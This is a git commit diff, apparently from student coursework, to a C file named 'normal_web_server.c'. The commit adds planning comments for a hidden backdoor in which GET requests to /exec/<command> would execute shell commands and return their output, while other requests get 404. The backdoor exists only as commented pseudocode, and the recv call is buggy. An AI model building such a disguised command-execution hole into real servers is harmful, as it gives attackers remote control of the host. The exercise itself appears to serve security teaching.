c0cfe3511b361e25217a4698bb7c6ec717cf22dd
Austen Mack <austen.mack@asu.edu>
2021-01-18 21:12:46 -0700

    adds bd_response, planning commentary, cleanup

--- normal_web_server.c
+++ normal_web_server.c
@@ -10,7 +10,6 @@ int main(int argc, char *argv[]) {
 
     int port = atoi(argv[1]);
 
-    //Create socket, define address, bind to address, listen to port
     int server_socket;
     server_socket = socket(PF_INET, SOCK_STREAM, 0);
 
@@ -22,27 +21,33 @@ int main(int argc, char *argv[]) {
     bind(server_socket, (struct sockaddr *) &server_address, sizeof(server_address));
 
     listen(server_socket, 1);    
-    
-    //GET requests of valid URL format get 404
-    //GET requests with URL of form /exec/<command> execute it using libc function
-    //HTTP response is stdout of executed command, status code 200
-    //No limit on characters, be able to handle anything
 
     //DOUBLE CHECK THIS HEADER FOR ACCURACY RE: RFC2616
-    char *normal_response_header =
-        "HTTP/1.1 200 OK\r\n"
-        "Content-Type: text/html\r\n"
-        "\r\n"
-        "<html><body>Too bad so sad, baby!</body></html>";
+    //MUST ALLOW GET AND HEAD METHODS, NONE ELSE - code 405 method not allowed
+    char *notfound_response =
+        "HTTP/1.1 404 Not Found\r\n\r\n";
+
+    char *bd_response = 
+        "HTTP/1.1 200 OK\r\n\r\n";
 
     int client_socket;
+    char client_buffer[1024];
+
+    //Need to figure out how to safely close socket on ^C or SIGINT
+
     while(1) {
         client_socket = accept(server_socket, NULL, NULL);
-        //if backdoor request
+        recv(client_socket, *client_buffer, sizeof(client_buffer), 0);
+        //parse client_buffer
+        //if GET && url is /exec/command (depends on rtn val){
+        //the_goods = strcat(bd_response, stdout);
+        //send(client_socket, the_goods, strlen(the_goods), 0);
+        //}
         
-        //else
-        send(client_socket, normal_response_header, strlen(normal_response_header), 0);
+        //else {
+        send(client_socket, notfound_response, strlen(notfound_response), 0);
         close(client_socket);
+        //}
     }
 
     return 0;
